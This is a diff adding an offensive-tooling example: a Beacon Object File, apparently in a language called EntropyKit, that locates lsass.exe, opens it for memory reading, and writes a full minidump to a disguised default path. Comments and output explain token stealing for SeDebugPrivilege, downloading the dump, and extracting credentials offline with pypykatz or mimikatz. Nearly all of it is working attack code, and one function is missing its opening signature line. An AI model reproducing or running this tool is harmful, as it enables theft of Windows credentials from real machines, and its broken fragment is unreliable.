@@ -1,0 +1,102 @@
+// SPDX-License-Identifier: Apache-2.0
+// bof_lsass_dump.etpy - credential-store memory dump.
+//
+// Locates lsass.exe via Toolhelp32, OpenProcess's it with
+// PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, then writes a full
+// minidump via dbghelp!MiniDumpWriteDump. The .dmp can be carried
+// back and processed offline with mimikatz / pypykatz / etc.
+//
+// Same tradecraft surface as nanodump / dumpert / Mimikatz'
+// `sekurlsa::minidump` - but in ~80 lines of EntropyKit source
+// instead of 800 of hand-rolled C with `#ifdef _MSC_VER` blocks.
+//
+// Pre-conditions:
+//   * SeDebugPrivilege (admin token OR steal token from a process
+//     that has it). Without it, OpenProcess returns NULL and the
+//     BOF reports `[!] OpenProcess failed`.
+//
+// Build:  entc compile example/bof_lsass_dump.etpy --type=bof
+// Args:   --zarg "C:\Path\to\output.dmp"   (optional; default below)
+// Run:    bof-runner example/bof_lsass_dump.obj --zarg "C:\\Windows\\Temp\\debug.bin"
+//
+
+use bof;
+use_c "stdlib/win32/toolhelp.h";
+
+// Find lsass.exe by walking the toolhelp snapshot. Returns its PID or 0 if not found.
+    var snap: u64 = (u64)Kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if snap == 0xFFFFFFFFFFFFFFFF {
+        BeaconPrintf(0, "[!] CreateToolhelp32Snapshot failed\n");
+        ret 0;
+    }
+    var pe: PROCESSENTRY32;
+    pe.dwSize = (u32)sizeof(PROCESSENTRY32);
+
+    var ok: int = Kernel32.Process32First((void*)snap, &pe);
+    var found: u32 = 0;
+    while ok != 0 {
+
+        if mem.cmp((char*)pe.szExeFile, "lsass.exe", 10) == 0 {
+            found = pe.th32ProcessID;
+        }
+        ok = Kernel32.Process32Next((void*)snap, &pe);
+    }
+    Kernel32.CloseHandle((void*)snap);
+    ret found;
+}
+
+fn go(args: char*, len: int) -> void {
+
+    var parser: datap;
+    BeaconDataParse(&parser, args, len);
+    var size: int;
+    var path: char* = BeaconDataExtract(&parser, &size);
+
+    if size == 0 {
+        path = "C:\\Windows\\Temp\\debug.bin";
+    }
+
+    var pid: u32 = find_lsass_pid();
+    if pid == 0 {
+        BeaconPrintf(0, "[!] lsass.exe not found in snapshot\n");
+        ret;
+    }
+    BeaconPrintf(0, str.format("[+] lsass.exe pid = {d}\n", (int)pid));
+
+    var h_proc: u64 = (u64)Kernel32.OpenProcess(
+        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid);
+    if h_proc == 0 {
+        BeaconPrintf(0, "[!] OpenProcess failed - SeDebugPrivilege required\n");
+        BeaconPrintf(0, "    (elevate, or impersonate a SYSTEM token first)\n");
+        ret;
+    }
+    BeaconPrintf(0, str.format("[+] OpenProcess OK, handle=0x{x}\n", (int)h_proc));
+
+    var h_file: u64 = (u64)Kernel32.CreateFileA(
+        path, GENERIC_WRITE, 0, (void*)0,
+        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, (void*)0);
+    if h_file == 0xFFFFFFFFFFFFFFFF {
+        Kernel32.CloseHandle((void*)h_proc);
+        BeaconPrintf(0, str.format("[!] CreateFileA(\"{s}\") failed\n", path));
+        ret;
+    }
+
+    BeaconPrintf(0, "[+] writing minidump...\n");
+    var dumped: int = Dbghelp.MiniDumpWriteDump(
+        (void*)h_proc, pid, (void*)h_file,
+        MiniDumpWithFullMemory,
+        (void*)0, (void*)0, (void*)0
+    );
+
+    Kernel32.CloseHandle((void*)h_file);
+    Kernel32.CloseHandle((void*)h_proc);
+
+    if dumped != 0 {
+        BeaconPrintf(0, str.format("[+] wrote {s}\n", path));
+        BeaconPrintf(0, "[+] retrieve via `download`, then offline:\n");
+        BeaconPrintf(0, "    pypykatz lsa minidump <file>\n");
+    } else {
+        BeaconPrintf(0, "[!] MiniDumpWriteDump failed\n");
+    }
+    ret;
+}
